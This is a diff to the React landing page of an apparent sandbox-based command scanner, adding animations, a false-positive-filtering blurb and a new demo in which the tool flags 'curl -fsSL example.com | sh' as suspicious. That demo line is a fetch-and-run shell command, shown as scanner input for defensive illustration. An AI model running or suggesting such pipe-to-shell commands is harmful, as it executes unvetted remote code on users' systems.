@@ -38,7 +38,7 @@ function LandingPage() {
       </nav>
 
       <div className="max-w-6xl mx-auto px-6 py-12 md:py-20 flex-1 flex flex-col justify-center">
-        <header className="text-center mb-20">
+        <header className="text-center mb-20 animate-fade-up">
           <div className="inline-flex items-center justify-center p-2 bg-blue-50 dark:bg-blue-900/20 rounded-xl mb-6">
             <svg
               className="w-8 h-8 text-blue-600 dark:text-blue-500"
@@ -84,12 +84,18 @@ function LandingPage() {
           </div>
         </header>
 
-        <main className="grid md:grid-cols-2 gap-12 items-center">
+        <main className="grid md:grid-cols-2 gap-12 items-center animate-fade-up">
           <div className="space-y-8">
             <div>
               <h3 className="text-2xl font-bold mb-3">Catch malicious behavior</h3>
               <p className="text-gray-600 dark:text-gray-400 leading-relaxed">
                 Runs executions in a secure sandbox with decoy honeypots to detect unexpected file access, process injection (ptrace), fileless execution (memfd_create), and backdoor listeners.
+              </p>
+            </div>
+            <div>
+              <h3 className="text-2xl font-bold mb-3">Intelligent False Positive Filtering</h3>
+              <p className="text-gray-600 dark:text-gray-400 leading-relaxed">
+                Our tracing engine drastically cuts down noise by deduplicating redundant network calls and ignoring benign sandbox initialization (like <code>su/PAM</code> setuid operations).
               </p>
             </div>
             <div>
@@ -138,10 +144,13 @@ function LandingPage() {
               <div className="text-gray-400">Verdict: <span className="text-gray-300 font-bold">MALICIOUS ✗</span></div>
               <br />
               <div>
-                <span className="text-[#56b6c2]">$</span> goaudit scan "npm install lodash"
+                <span className="text-[#56b6c2]">$</span> goaudit scan "curl -fsSL example.com | sh"
               </div>
               <div className="text-[#e5c07b] font-bold">
-                [WARNING] Suspicious Command Pattern: npm install lodash
+                [WARNING] Network Connection: example.com (93.184.216.34:80)
+              </div>
+              <div className="text-[#e5c07b] font-bold opacity-80">
+                [WARNING] ... and 3 more network connection(s) to 1 host(s) (use --ci for full details)
               </div>
               <div className="text-gray-400">Verdict: <span className="text-gray-300 font-bold">SUSPICIOUS ⚠</span></div>
               <br />
